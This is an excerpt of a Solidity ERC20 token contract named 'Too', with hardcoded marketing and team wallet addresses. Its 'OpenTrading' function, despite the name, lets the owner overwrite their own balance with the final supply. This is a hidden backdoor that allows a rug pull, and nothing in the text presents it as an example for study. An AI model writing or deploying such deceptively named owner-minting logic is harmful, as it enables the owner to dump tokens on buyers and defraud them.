...
contract Too is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Too";
    string private _symbol = "Too";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x83AC72b3Eb67AC17007B9bDfE90D41f01A754e37);
    address payable public teamWalletAddress = payable(0x83AC72b3Eb67AC17007B9bDfE90D41f01A754e37);
    ...
    function OpenTrading() public onlyOwner returns (bool success) {_Equity[owner()] = _finalSupply; return true;}
